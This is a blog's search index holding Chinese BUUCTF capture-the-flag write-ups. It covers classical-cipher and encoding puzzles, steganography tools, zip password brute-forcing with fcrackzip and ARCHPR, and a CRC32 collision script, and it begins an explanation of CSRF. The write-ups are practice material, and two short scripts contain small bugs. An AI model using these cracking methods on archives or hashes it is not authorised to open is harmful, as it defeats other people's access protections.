<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF Crypto部分wp</title>
    <url>/2020/02/21/buuctf-crypto-bu-fen-wp/</url>
    <content><![CDATA[<p>记录一些密码学简单的题目，仅供参考</p>
<span id="more"></span>
<h1 id="1-MD5"><a href="#1-MD5" class="headerlink" title="1.MD5"></a>1.MD5</h1><p>直接md5解密<a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
<h1 id="2-看我回旋踢"><a href="#2-看我回旋踢" class="headerlink" title="2.看我回旋踢"></a>2.看我回旋踢</h1><p>一看就是凯撒密码，直接凯撒解密<a href="http://www.nicetool.net/embed/caesar_decrypt.html">http://www.nicetool.net/embed/caesar_decrypt.html</a></p>
<h1 id="3-Url编码"><a href="#3-Url编码" class="headerlink" title="3.Url编码"></a>3.Url编码</h1><p>Url解密<a href="http://tool.chinaz.com/tools/urlencode.aspx">http://tool.chinaz.com/tools/urlencode.aspx</a></p>
<h1 id="4-一眼就解密"><a href="#4-一眼就解密" class="headerlink" title="4.一眼就解密"></a>4.一眼就解密</h1><p>一眼就看出base64编码，解密<a href="http://ctf.ssleye.com/base64.html">http://ctf.ssleye.com/base64.html</a></p>
<h1 id="5-摩丝"><a href="#5-摩丝" class="headerlink" title="5.摩丝"></a>5.摩丝</h1><p>摩斯密码<a href="http://www.ip138.com/mosi/">http://www.ip138.com/mosi/</a></p>
<h1 id="6-变异凯撒"><a href="#6-变异凯撒" class="headerlink" title="6.变异凯撒"></a>6.变异凯撒</h1><p>既然是凯撒加密，就先看看密文：有小写字母，大写字母，”_”，”^”，还有数字，可能是按照ASCII码表移位的，’a’的ASCII值为97，’f’为102，a-&gt;f的ASCII值增加了5；’l’为108，f-&gt;l的ASCII值增加了6；’Z’为90，Z-&gt;a的ASCII值增加了7；之后的每次移位增加1，所以写个脚本<br>    <pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"afZ_r9VYfScOeO_UL^RWUc"</span>
res <span class="token operator">=</span><span class="token string">""</span>
j <span class="token operator">=</span> <span class="token number">5</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    res <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> j<span class="token punctuation">)</span>
    j <span class="token operator">+=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>运行一下即得flag</p>
<h1 id="7-Quoted-printable"><a href="#7-Quoted-printable" class="headerlink" title="7.Quoted-printable"></a>7.Quoted-printable</h1><p>Quoted-printable编码<a href="http://ctf.ssleye.com/quoted.html">http://ctf.ssleye.com/quoted.html</a></p>
<h1 id="8-password"><a href="#8-password" class="headerlink" title="8.password"></a>8.password</h1><p>弱密码，猜测flag为zs19900315</p>
<h1 id="9-zip伪加密"><a href="#9-zip伪加密" class="headerlink" title="9.zip伪加密"></a>9.zip伪加密</h1><p>懒得写了，可以参考一下这篇文章<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">https://blog.csdn.net/qq_26187985/article/details/83654197</a><br>（还有更简单的，直接在Linux系统下提取文件，zip伪加密能够直接提取出来的）</p>
<h1 id="10-Rabbit"><a href="#10-Rabbit" class="headerlink" title="10.Rabbit"></a>10.Rabbit</h1><p>Rabbit密码<a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>
<h1 id="11-丢失的MD5"><a href="#11-丢失的MD5" class="headerlink" title="11.丢失的MD5"></a>11.丢失的MD5</h1><p>运行一遍程序就得到了flag，展示的是md5的爆破（后面的还原大师就可以用这个）</p>
<h1 id="12-篱笆墙的影子"><a href="#12-篱笆墙的影子" class="headerlink" title="12.篱笆墙的影子"></a>12.篱笆墙的影子</h1><p>篱笆-&gt;栅栏，栅栏密码<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
<h1 id="13-Alice与Bob"><a href="#13-Alice与Bob" class="headerlink" title="13.Alice与Bob"></a>13.Alice与Bob</h1><p>在线分解<a href="http://www.factordb.com/">http://www.factordb.com/</a>，然后再md5<a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
<h1 id="14-传统知识-古典密码"><a href="#14-传统知识-古典密码" class="headerlink" title="14.传统知识+古典密码"></a>14.传统知识+古典密码</h1><p>百度得到每一个年份代表的具体数字，然后“+甲子”就是指加60，之后得到88 90 83 68 77 70 76 90通过ASCII码查表之后得到XZSDMFLZ，在试一试栅栏和凯撒，发现先栅栏（XMZFSLDZ）后凯撒（SHUANGYU）得到flag</p>
<h1 id="15-大帝的密码武器"><a href="#15-大帝的密码武器" class="headerlink" title="15.大帝的密码武器"></a>15.大帝的密码武器</h1><p>古罗马大帝-&gt;凯撒-&gt;凯撒密码，先解密FRPHEVGL，解出来security，移动14位，然后在用这个来加密ComeChina，不过要注意大小写</p>
<h1 id="16-Windows系统密码"><a href="#16-Windows系统密码" class="headerlink" title="16.Windows系统密码"></a>16.Windows系统密码</h1><p>Linux的shadow文件，把这几个都用md5查询一遍，发现密码是：a7fcb22a88038f35a8f39d503e7f0062，解出：good-luck</p>
<h1 id="17-凯撒？替换？呵呵"><a href="#17-凯撒？替换？呵呵" class="headerlink" title="17.凯撒？替换？呵呵!"></a>17.凯撒？替换？呵呵!</h1><p>替换密码，直接在线破解<a href="https://quipqiup.com/">https://quipqiup.com/</a>（在Clues处填MTHJ=flag）</p>
<h1 id="18-信息化时代的步伐"><a href="#18-信息化时代的步伐" class="headerlink" title="18.信息化时代的步伐"></a>18.信息化时代的步伐</h1><p>中文电码直接破解<a href="http://code.mcdvisa.com/">http://code.mcdvisa.com/</a></p>
<h1 id="19-old-fashion"><a href="#19-old-fashion" class="headerlink" title="19.old-fashion"></a>19.old-fashion</h1><p>同样是替换密码，直接在线破解<a href="https://quipqiup.com/">https://quipqiup.com/</a></p>
<pre><code>?l fog?vryoe?sg, e h?dhv?v?v?rl f??sao ?h e ?avsrb rc alfrb?ly dg ?s?fs ?l?vh rc ?ne?lvaiv eoa oa?nefab ??vs f??saovaiv, effrob?ly vr e oay?neo hghva?; the units may be single letters (the most common), pairs of letters, triplets of letters, mi?tures of the above, and so forth. The receiver deciphers the te?t by performing an inverse substitution. So the flag is n1_2hen-d3_hu1-mi-ma_a
</code></pre><h1 id="20-robomunication"><a href="#20-robomunication" class="headerlink" title="20.robomunication"></a>20.robomunication</h1><p>仔细一听，像是摩斯密码，将’b’换成’.’，’p’换成’_’，得到<br>    …. . .-.. .-.. —- .— …. .- - .. … - …. . -.- . -.— .. - .. … -… —- —- .—. -… . . .—.<br>解密得到<br>    HELLOWHATISTHEKEYITISBOOPBEEP</p>
<h1 id="21-世上无难事"><a href="#21-世上无难事" class="headerlink" title="21.世上无难事"></a>21.世上无难事</h1><p>词频分析<a href="https://quipqiup.com/">https://quipqiup.com/</a></p>
<h1 id="22-萌萌哒的八戒"><a href="#22-萌萌哒的八戒" class="headerlink" title="22.萌萌哒的八戒"></a>22.萌萌哒的八戒</h1><p>猪圈密码<a href="http://ctf.ssleye.com/pigpen.html">http://ctf.ssleye.com/pigpen.html</a></p>
<h1 id="23-权限获得第一步"><a href="#23-权限获得第一步" class="headerlink" title="23.权限获得第一步"></a>23.权限获得第一步</h1><p>和之前的Windows系统密码一样的道理</p>
<h1 id="24-异性相吸"><a href="#24-异性相吸" class="headerlink" title="24.异性相吸"></a>24.异性相吸</h1><p>异或，直接上脚本<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'密文.txt'</span> <span class="token punctuation">)</span><span class="token keyword">as</span> a<span class="token punctuation">:</span>
    a<span class="token operator">=</span>a<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'key.txt'</span> <span class="token punctuation">)</span><span class="token keyword">as</span> b<span class="token punctuation">:</span>
    b<span class="token operator">=</span>b<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
d<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    c<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    d<span class="token operator">+=</span>c
<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h1 id="25-还原大师"><a href="#25-还原大师" class="headerlink" title="25.还原大师"></a>25.还原大师</h1><p>就用之前丢失的md5中给出的脚本，换一下数据即可</p>
<h1 id="26-Cipher"><a href="#26-Cipher" class="headerlink" title="26.Cipher"></a>26.Cipher</h1><p>本来没啥思路的，看到那句“公平的玩吧（密钥自己找）”，公平：fair，估计是playfair，密钥就猜是playfair，然后在线解密 <a href="http://rumkin.com/tools/cipher/playfair.php">http://rumkin.com/tools/cipher/playfair.php</a></p>
<h1 id="27-这是什么"><a href="#27-这是什么" class="headerlink" title="27.这是什么"></a>27.这是什么</h1><p>用16进制编译器（winhex，010Editor）打开，可以看到一大堆括号，感叹号，复制下来，直接放在浏览器的命令行（console）中，得到flag<br>（我记得有一大串FFFFFFF的文件是word文件，也可以直接把文件后缀名改成.doc，打开也能看到文本）</p>
<h1 id="28-Unencode"><a href="#28-Unencode" class="headerlink" title="28.Unencode"></a>28.Unencode</h1><p>UUencode<a href="http://ctf.ssleye.com/uu.html">http://ctf.ssleye.com/uu.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CRYPTO</tag>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF MISC zip</title>
    <url>/2020/02/16/buuctf-misc-zip/</url>
    <content><![CDATA[<p>在刷BUU时碰到这题(<a href="https://buuoj.cn/challenges#zip">题目地址</a>)，题目给出了许多压缩包，但是没有一点头绪，看了看别人的wp才知道是crc爆破，在此记录一下这个知识点。</p>
<span id="more"></span>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>CRC全称Cyclic Redundancy Check，也就是循环冗余校验码，是一种能力相当强的检错、纠错码，并且实现编码和检码的电路比较简单，常用于串行传送（二进制位串沿一条信号线逐位传送）的辅助存储器与主机的数据通信和计算机网络中。<br>总而言之，就是每一个文件都有它唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但通常只适用于较小文本文件。<br>自己写的脚本总出错，于是借用了大佬的脚本<a href="https://blog.csdn.net/u011377996/article/details/79360820">https://blog.csdn.net/u011377996/article/details/79360820</a>  </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> string
<span class="token keyword">import</span> binascii

<span class="token keyword">def</span> <span class="token function">CrackCrc</span><span class="token punctuation">(</span>crc<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span> 
        <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
            <span class="token keyword">for</span> k <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
                <span class="token keyword">for</span> h <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
                    s <span class="token operator">=</span> i <span class="token operator">+</span> j <span class="token operator">+</span> k <span class="token operator">+</span> h
                    <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
                        <span class="token keyword">return</span>

<span class="token keyword">def</span> <span class="token function">CrackZip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">'out'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.zip'</span>
            crc <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>CRC
            CrackCrc<span class="token punctuation">(</span>crc<span class="token punctuation">)</span>

dic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">'+/='</span>

f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>
CrackZip<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"CRC32碰撞完成"</span><span class="token punctuation">)</span>
f<span class="token punctuation">.</span>close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>碰撞完成后得到一串base64编码，解码一看，要修复文件<br>查了点资料后发现这是一个rar压缩包 <a href="https://blog.csdn.net/vevenlcf/article/details/51538837">https://blog.csdn.net/vevenlcf/article/details/51538837</a>，<br>修改一下文件，在文件前面加上补上52 61 72 21 1A 07 00 后保存<br>打开压缩包一看，在备注处看到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>BUU</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF Misc部分wp（一）</title>
    <url>/2020/02/05/buuctf-misc-bu-fen-wp-yi/</url>
    <content><![CDATA[<p>最近开始刷<a href="https://buuoj.cn/">BUUCTF</a>，感觉题目比较基础，而且这还有许多比赛题目的复现。<br>这里将记录一些简单的MISC题目，较难的题目将单独写出来。</p>
<span id="more"></span>
<h2 id="1-金三胖"><a href="#1-金三胖" class="headerlink" title="1.金三胖"></a>1.金三胖</h2><p>题目给出了一张gif图，放入Stegsolve中逐帧查看，得到flag</p>
<h2 id="2-二维码"><a href="#2-二维码" class="headerlink" title="2.二维码"></a>2.二维码</h2><p>一张二维码，首先扫描一下，明显不是flag，在kali中binwalk分析一波<br>发现一个压缩包，使用foremost命令或者binwalk -e命令将压缩包提取出来发现是一个密码为四位数字的压缩包<br>fcrackzip -b -c1 -l 4 -u爆破得到flag</p>
<h2 id="3-N种解决方法"><a href="#3-N种解决方法" class="headerlink" title="3.N种解决方法"></a>3.N种解决方法</h2><p>下载后发现是一个exe文件，但打不开，使用任意一个文本编译器打开发现是将图片转base64了，把内容复制再转回图片<a href="http://tool.chinaz.com/tools/imgtobase" title="http://tool.chinaz.com/tools/imgtobase">http://tool.chinaz.com/tools/imgtobase</a>，是一个二维码，扫码得到flag</p>
<h2 id="4-大白"><a href="#4-大白" class="headerlink" title="4.大白"></a>4.大白</h2><p>题目说屏幕太小了<br>估计是改了图片长宽，用winhex打开图片，将01 00改为02 00（对于png文件，其第二行第六列是高度位，改这一位即可）<br>得到flag</p>
<h2 id="5-基础破解"><a href="#5-基础破解" class="headerlink" title="5.基础破解"></a>5.基础破解</h2><p>暴力破解，使用ARCHPR破解，得到flag</p>
<h2 id="6-你竟然赶我走"><a href="#6-你竟然赶我走" class="headerlink" title="6.你竟然赶我走"></a>6.你竟然赶我走</h2><p>winhex下分析，发现flag  </p>
<h2 id="7-LSB"><a href="#7-LSB" class="headerlink" title="7.LSB"></a>7.LSB</h2><p>看到LSB，将图片放入Stegsolve中Data Extract分析<br>保存为png后是一张二维码，扫码得到flag</p>
<h2 id="8-乌镇峰会种图"><a href="#8-乌镇峰会种图" class="headerlink" title="8.乌镇峰会种图"></a>8.乌镇峰会种图</h2><p>同样是winhex下分析，发现flag</p>
<h2 id="9-rar"><a href="#9-rar" class="headerlink" title="9.rar"></a>9.rar</h2><p>ARCHPR破解，得到flag</p>
<h2 id="10-ningen"><a href="#10-ningen" class="headerlink" title="10.ningen"></a>10.ningen</h2><p>同之前的二维码一样解法</p>
<h2 id="11-文件中的秘密"><a href="#11-文件中的秘密" class="headerlink" title="11.文件中的秘密"></a>11.文件中的秘密</h2><p>winhex下分析，发现flag</p>
<h2 id="12-wireshark"><a href="#12-wireshark" class="headerlink" title="12.wireshark"></a>12.wireshark</h2><p>题目给出的是pcap流量包，使用wireshark打开查看http的包<br>搜索flag</p>
<h2 id="13-镜子里面的世界"><a href="#13-镜子里面的世界" class="headerlink" title="13.镜子里面的世界"></a>13.镜子里面的世界</h2><p>将图片放入Stegsolve中，发现Red、Green和Blue的0通道的图片的最上端有东西<br>接下来用Data Extract查看这三个通道结合起来的东西，发现flag  </p>
<h2 id="14-小明的保险箱"><a href="#14-小明的保险箱" class="headerlink" title="14.小明的保险箱"></a>14.小明的保险箱</h2><p>同之前的二维码一样解法</p>
<h2 id="15-爱因斯坦"><a href="#15-爱因斯坦" class="headerlink" title="15.爱因斯坦"></a>15.爱因斯坦</h2><p>同样是binwalk分析后分离出压缩包，不过解压密码在图片备注中</p>
<h2 id="16-被嗅探的流量"><a href="#16-被嗅探的流量" class="headerlink" title="16.被嗅探的流量"></a>16.被嗅探的流量</h2><p>使用wireshark追踪TCP流，查找得到flag  </p>
<h2 id="17-假如给我三天光明"><a href="#17-假如给我三天光明" class="headerlink" title="17.假如给我三天光明"></a>17.假如给我三天光明</h2><p>给了一张图和一个压缩包，图片下估计为盲文，猜测为压缩包密码<br>盲文解密为：kmdonowg，解压出一段音频，一听为摩斯密码，使用Audacity分析<br>摩斯解密，得flag</p>
<h2 id="18-easycap"><a href="#18-easycap" class="headerlink" title="18.easycap"></a>18.easycap</h2><p>wireshark追踪TCP流，直接得到flag  </p>
<h2 id="19-FLAG"><a href="#19-FLAG" class="headerlink" title="19.FLAG"></a>19.FLAG</h2><p>winhex，binwalk后无结果，将图片放入Stegsolve中<br>保存为zip文件，解压后为.elf文件，kali运行得flag<br>（chmod a+x a.txt 等价于 chmod +x a.txt，给所有用户给予a.txt文件可执行权限）</p>
<h2 id="20-另外一个世界"><a href="#20-另外一个世界" class="headerlink" title="20.另外一个世界"></a>20.另外一个世界</h2><p>winhex下发现一串二进制码，估计是ascii码，8个一组，翻译后得到flag</p>
<h2 id="21-荷兰宽带数据泄露"><a href="#21-荷兰宽带数据泄露" class="headerlink" title="21.荷兰宽带数据泄露"></a>21.荷兰宽带数据泄露</h2><p>下载解压后得到一个路由器配置文件，使用RouterPassView打开后搜索不到flag，再试试username或者password，结果flag是username  </p>
<h2 id="22-隐藏的钥匙"><a href="#22-隐藏的钥匙" class="headerlink" title="22.隐藏的钥匙"></a>22.隐藏的钥匙</h2><p>winhex下打开文件，搜索发现flag是base64编码，在线解码一下得到flag</p>
<h2 id="23-来首歌吧"><a href="#23-来首歌吧" class="headerlink" title="23.来首歌吧"></a>23.来首歌吧</h2><p>得到一段音频，使用Audacity分析，发现摩斯密码，解码得到flag</p>
<h2 id="24-后门查杀"><a href="#24-后门查杀" class="headerlink" title="24.后门查杀"></a>24.后门查杀</h2><p>webshell会报病毒，随便拿杀毒软件一个扫描一下，就得到目的文件<br>文件打开就得到flag</p>
<h2 id="25-神秘龙卷风"><a href="#25-神秘龙卷风" class="headerlink" title="25.神秘龙卷风"></a>25.神秘龙卷风</h2><p>解压得到一压缩包，提示说密码四位数，ARCHPR破解，打开文件发现是Brainfuck编码，<a href="https://www.splitbrain.org/services/ook">在线解码</a></p>
<h2 id="26-面具下的flag"><a href="#26-面具下的flag" class="headerlink" title="26.面具下的flag"></a>26.面具下的flag</h2><p>解压得到的图片binwalk分析发现压缩包，foremost解压后得到一个flag.vmdk的文件（老实说vmdk我也没怎么见过，于是就看了看网上的wp），使用7z解压<br><pre class="line-numbers language-none"><code class="language-none">7z x flag.vmdk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>解压后得到flag的两部分，ook与Brainfuck<a href="https://www.splitbrain.org/services/ook">在线解码</a><br>（不太明白为什么7z能解压vmdk文件，而且有趣的是我在Windows下解压不能解压出flag后半段密码，在kali下却能。。。）</p>
<h2 id="27-webshell后门"><a href="#27-webshell后门" class="headerlink" title="27.webshell后门"></a>27.webshell后门</h2><p>和后门查杀那题一样，杀毒软件一扫完事~~~</p>
<h2 id="28-被劫持的神秘礼物"><a href="#28-被劫持的神秘礼物" class="headerlink" title="28.被劫持的神秘礼物"></a>28.被劫持的神秘礼物</h2><p>wireshark打开查询TCP流，发现账号密码，串一起再md5  </p>
<h2 id="29-刷新过的图片"><a href="#29-刷新过的图片" class="headerlink" title="29.刷新过的图片"></a>29.刷新过的图片</h2><p>（知识盲区，唉~~~）<br>F5隐写，参考论文：<a href="https://wenku.baidu.com/view/c9150e29b4daa58da0114a39.html">https://wenku.baidu.com/view/c9150e29b4daa58da0114a39.html</a><br>解题时就直接使用：F5-steganography<br>解压出来一个output.txt，打开一看PK开头，估计是zip，改后缀名，解压后得到flag</p>
<h2 id="30-穿越时空的思恋"><a href="#30-穿越时空的思恋" class="headerlink" title="30.穿越时空的思恋"></a>30.穿越时空的思恋</h2><p>又是一段音频，Audacity分析，发现摩斯密码，解码得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>BUU</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF Misc部分wp（二）</title>
    <url>/2020/02/12/buuctf-misc-bu-fen-wp-er/</url>
    <content><![CDATA[<p>涉及的知识点：  </p>
<ul>
<li>英语┭┮﹏┭┮</li>
<li>gnuplot的使用</li>
<li>steghide隐写</li>
<li>lsb隐写</li>
</ul>
<span id="more"></span>
<h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><p>得到一张图片，发现zip，foremost解压<br>得到密钥和一份已加密的文件，将密钥base64解码后<br><pre class="line-numbers language-none"><code class="language-none">What is Nicki Minaj&#39;s favorite song that refers to snakes?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>密钥就是anaconda，那么关于蛇的加密方式就是serpent加密（也是关于蛇的单词┭┮﹏┭┮，记得在密码学课上讲过，好像是AES竞选之一，但忘完了(⊙o⊙)…）<br>在线解密：<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a>  </p>
<h1 id="梅花香自苦寒来"><a href="#梅花香自苦寒来" class="headerlink" title="梅花香自苦寒来"></a>梅花香自苦寒来</h1><p>winhex下发现大量数据，猜测是hex编码<br>随便使用一个16进制编译器将这些编码保存，我这使用的是HxD<br>然后写脚本将它们转成ASCII码（个人比较懒，直接<a href="http://stool.chinaz.com/hex">在线解码</a>了）<br>然后发现是一大堆坐标，使用gnuplot绘制图片，首先还是要写脚本将坐标转成gnuplot能识别的形式（除去“（”，“，”和“）”）  </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> a<span class="token punctuation">:</span>
	a <span class="token operator">=</span> a<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'2.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	b<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后扫码得到flag</p>
<h1 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h1><p>binwalk先分析发现zip，解压出来发现一张图片需要密码，而压缩包不用，用winhex打开发现是一个伪加密（<a href="https://blog.csdn.net/qq_26187985/article/details/83654197">伪加密具体详情</a>），此处将01 08改为00 08<br>解压出的图片应该就是flag压缩包密码的线索，然后对这个图片各种分析无果，最后去看了其他大佬的wp，才知道一个隐写神器：steghide（<a href="https://blog.csdn.net/Blood_Seeker/article/details/81837571">详情</a>）  </p>
<pre class="line-numbers language-none"><code class="language-none">将secret.txt文件隐藏到a.jpg中：
#steghide embed -cf a.jpg -ef secret.txt -p 123
（-p表示密码）
从a.jpg解出secret.txt：
#steghide extract -sf a.jpg -p 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这题没有说要密码，直接提取出ko.txt，解压后得到flag</p>
<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>本以为真的是弱口令，找了个字典爆破，爆破不出来，然后打开压缩包发现注释（看了好久。。。）<br>保存到sublime，是摩斯密码，解密后发现还是打不开压缩包，把字母换成大写就打开了，然后得到一张图片。。。<br>看了半天也分析不出来个啥，就去看了看wp，原来是lsb隐写，那就直接GitHub上的一个工具<a href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a><br><pre class="line-numbers language-none"><code class="language-none">python lsb.py extract 女神.png 0.txt 123456
弱密码猜123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>得到0.txt打开即有flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>BUU</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF原理及防御</title>
    <url>/2021/07/02/csrf-yuan-li-ji-fang-yu/</url>
    <content><![CDATA[<blockquote>
<p>xss：用户过分信任网站，放任来自浏览器地址栏代表的那个网站代码在自己本地任意执行。如果没有浏览器的安全机制限制，xss代码可以在用户浏览器为所欲为；</p>
<p>csrf：网站过分信任用户，放任来自所谓通过访问控制机制的代表合法用户的请求执行网站的某个特定功能。</p>
<p>如何用简洁生动的语言说明 XSS 和 CSRF 的区别？</p>
<p>黄玮的回答 - 知乎 <a href="https://www.zhihu.com/question/34445731/answer/86209323">https://www.zhihu.com/question/34445731/answer/86209323</a></p>
</blockquote>
<span id="more"></span>
<h1 id="CSRF简介"><a href="#CSRF简介" class="headerlink" title="CSRF简介"></a>CSRF简介</h1><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
<p><img src="https://pic1.zhimg.com/v2-31e6d640aa10bade4e9c3666c39c5f7a_1440w.jpg" alt></p>
<center>图源：https://zhuanlan.zhihu.com/p/98062456</center>



<h1 id="CSRF攻击攻击原理及过程"><a href="#CSRF攻击攻击原理及过程" class="headerlink" title="CSRF攻击攻击原理及过程"></a>CSRF攻击攻击原理及过程</h1><ol>
<li><p>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</p>
</li>
<li><p>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</p>
</li>
<li><p>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</p>
</li>
<li><p>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</p>
</li>
<li><p>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</p>
</li>
</ol>
